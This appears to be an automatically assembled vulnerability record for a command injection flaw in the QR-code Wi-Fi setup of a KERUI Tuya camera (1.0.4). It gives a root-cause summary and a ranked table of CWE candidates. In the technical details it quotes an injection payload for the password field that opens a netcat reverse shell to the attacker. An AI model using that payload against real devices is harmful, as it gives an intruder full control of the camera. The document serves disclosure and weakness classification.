## Vulnerability Description
KERUI HD 3MP 1080P Tuya Camera 1.0.4 has a **command injection** vulnerability in the module that connects to the local network via a QR code. This vulnerability allows an attacker to create a custom, unauthenticated QR code and abuse one of the parameters, either SSID or PASSWORD, in the JSON data contained within the QR code. By that, the attacker can execute arbitrary code on the camera.

### Vulnerability Description Key Phrases
- **weakness:** **command injection**
- **impact:** execute arbitrary code
- **vector:** custom unauthenticated QR code
- **attacker:** attacker
- **product:** KERUI HD 3MP 1080P Tuya Camera
- **version:** 1.0.4
- **component:** module connecting to local network via QR code

## CVE Reference Links Content Summary
Based on the provided content, here's a breakdown of the vulnerability described:

**Root Cause of Vulnerability:**
The root cause is a command injection vulnerability in the `sys_connect_wifi` function. This function takes the SSID and password extracted from a scanned QR code and uses them to construct a shell command for connecting to Wi-Fi. The lack of sanitization on these inputs allows an attacker to inject arbitrary commands into the shell command.

**Weaknesses/Vulnerabilities Present:**
- **Command Injection:** The primary vulnerability is the direct use of user-provided (QR code scanned) input (SSID and password) within a system command without proper sanitization. This allows an attacker to execute arbitrary shell commands on the device.

**Impact of Exploitation:**
- **Remote Code Execution (RCE):** Successful exploitation allows an attacker to execute arbitrary code on the camera.
- **Full System Control:** With RCE, an attacker can gain complete control over the camera, potentially leading to:
    - Data exfiltration (e.g., video feeds)
    - Modification of camera settings
    - Installation of malware
    - Use of the camera as a bot in a botnet

**Attack Vectors:**
- **QR Code Scanning:** The attack vector is the camera's QR code scanning functionality, used to connect to Wi-Fi networks.
- **Malicious QR Code:** The attacker crafts a malicious QR code containing a specially crafted payload within the password field that includes shell commands.

**Required Attacker Capabilities/Position:**
- **Physical Access:** The attacker needs to present the malicious QR code to the camera's lens.
- **Basic Network Knowledge:** The attacker needs basic network knowledge to set up a listener for the reverse shell, and create a network for the camera to connect to.
- **QR Code Generation:** Ability to generate a QR code with a specific format and command injection payload.

**Technical Details:**
- The vulnerable function is `sys_connect_wifi`.
- The vulnerability occurs because the `ssid` and `password` parameters from the scanned QR code are used directly in a call to the `system()` function without proper sanitization.
- The attacker can inject a payload, for example `$(sh /usr/sbin/lv_wifi_connect.sh {SSID} {PASSWORD} & sleep 30; nc {NC_IP} {NC_PORT} -e /bin/sh)`, into the password field of the QR code.
- The camera connects to the wifi using `lv_wifi_connect.sh` script and after some time a reverse shell will connect to the attacker's netcat listener.

**Additional Notes:**
- The article mentions that the vendor (TUYA) has not responded to the vulnerability report.
- Other potential vulnerabilities, like buffer overflows, were identified but not focused on due to the ease of exploitation of the command injection vulnerability.
- The article details the process of gaining root access to the device via UART, extracting the firmware, enabling telnet and FTP, debugging, and reverse engineering the binary to find the vulnerability, these steps are not necessary for exploitation but provided more context of the device's inner workings.

## Retriever Results

### Top Combined Results

| Rank | CWE ID | Name | Abstraction | Usage  | Retrievers | Individual Scores |
|------|--------|------|-------------|-------|------------|-------------------|
| 1 | 77 | Improper Neutralization of Special Elements used in a Command ('Command Injection') | Class | Allowed-with-Review | alternate_terms | 1.000 |
| 2 | 78 | Improper Neutralization of Special Elements used in an OS Command ('OS Command Injection') | Base | Allowed | alternate_terms | 0.700 |
| 3 | 138 | Improper Neutralization of Special Elements | Class | Discouraged | sparse | 0.370 |
| 4 | 94 | Improper Control of Generation of Code ('Code Injection') | Base | Allowed-with-Review | sparse | 0.364 |
| 5 | 88 | Improper Neutralization of Argument Delimiters in a Command ('Argument Injection') | Base | Allowed | sparse | 0.355 |
| 6 | 22 | Improper Limitation of a Pathname to a Restricted Directory ('Path Traversal') | Base | Allowed | sparse | 0.355 |
| 7 | 116 | Improper Encoding or Escaping of Output | Class | Allowed-with-Review | sparse | 0.352 |
| 8 | 306 | Missing Authentication for Critical Function | Base | Allowed | sparse | 0.352 |
| 9 | 790 | Improper Filtering of Special Elements | Class | Allowed-with-Review | dense | 0.541 |
| 10 | 184 | Incomplete List of Disallowed Inputs | Base | Allowed | graph | 0.002 |



# Complete CWE Specifications

CWE-77: Improper Neutralization of Special Elements used in a Command ('Command Injection')

CWE-78: Improper Neutralization of Special Elements used in an OS Command ('OS Command Injection')

CWE-138: Improper Neutralization of Special Elements

CWE-94: Improper Control of Generation of Code ('Code Injection')

CWE-88: Improper Neutralization of Argument Delimiters in a Command ('Argument Injection')

CWE-22: Improper Limitation of a Pathname to a Restricted Directory ('Path Traversal')

CWE-116: Improper Encoding or Escaping of Output

CWE-306: Missing Authentication for Critical Function

CWE-790: Improper Filtering of Special Elements

CWE-184: Incomplete List of Disallowed Inputs